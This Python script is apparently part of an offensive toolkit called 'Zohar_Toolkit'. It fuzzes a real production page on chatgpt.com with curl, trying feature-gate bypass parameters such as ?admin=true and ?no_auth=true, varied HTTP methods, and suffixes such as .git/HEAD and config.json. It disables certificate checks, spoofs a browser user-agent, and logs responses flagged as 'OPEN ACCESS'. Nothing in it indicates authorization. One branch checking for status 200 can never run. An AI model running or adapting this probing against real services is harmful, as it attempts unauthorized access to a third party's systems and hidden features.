import os
import sys
import subprocess
import time
import json

print("DEBUG: Script started.")

try:
    # Ensure Zohar_Toolkit is in path
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    # Try importing directly assuming running from Zohar_Toolkit
    try:
        from HiveMind.HiveMind import HiveMind
    except ImportError:
        # Fallback if path issues
        sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "HiveMind"))
        from HiveMind import HiveMind
except Exception as e:
    print(f"DEBUG: Import Error: {e}")

class Phase17_FeatureFuzz:
    def __init__(self):
        self.brain = HiveMind()
        self.target_url = "https://chatgpt.com/features/deep-research/"
        self.base_curl = [
            "curl", "-s", "-I", "-k", "--ssl-no-revoke",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

    def run(self):
        print(f"[*] Starting Phase 17: Feature Gate Fuzzing on {self.target_url}...")
        
        # 1. Parameter Pollution
        params = [
            "?debug=true", "?test=1", "?internal=true", "?beta=true", "?feature_gate=open",
            "?bypass=true", "?preview=true", "?admin=true", "?no_auth=true"
        ]
        
        # 2. Method Smuggling (Simulated via different verbs)
        methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT"]
        
        # 3. Path Traversal / Suffixes
        suffixes = [
            "index.html", "manifest.json", "config.json", "debug", ".git/HEAD"
        ]

        # Test Params
        print("\n[*] Testing Parameter Pollution...")
        for p in params:
            url = f"{self.target_url}{p}"
            self._probe(url, "GET")

        # Test Methods
        print("\n[*] Testing HTTP Methods...")
        for m in methods:
            self._probe(self.target_url, m)
            
        # Test Suffixes
        print("\n[*] Testing Path Suffixes...")
        for s in suffixes:
            url = f"{self.target_url}{s}"
            self._probe(url, "GET")

    def _probe(self, url, method):
        print(f"[*] Probing {method} {url} ...", end="\r")
        cmd = self.base_curl.copy()
        cmd.extend(["-X", method, url])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout
            
            # Parse Status
            status_line = output.split('\n')[0] if output else "Unknown"
            status_code = "Unknown"
            if "HTTP" in status_line:
                parts = status_line.split(' ')
                if len(parts) > 1:
                    status_code = parts[1]
            
            if status_code != "302" and status_code != "403" and status_code != "Unknown":
                 print(f"\n[!] INTERESTING: {status_code} on {method} {url}")
                 self.brain.log_attempt(url, f"Feature Fuzz ({method})", status_code, url)
            elif status_code == "200":
                 print(f"\n[!] CRITICAL: OPEN ACCESS on {method} {url}")
                 self.brain.log_attempt(url, f"Feature Fuzz ({method})", status_code, url)

            time.sleep(0.3)
            
        except Exception as e:
            print(f"\n[!] Error: {e}")

if __name__ == "__main__":
    fuzzer = Phase17_FeatureFuzz()
    fuzzer.run()
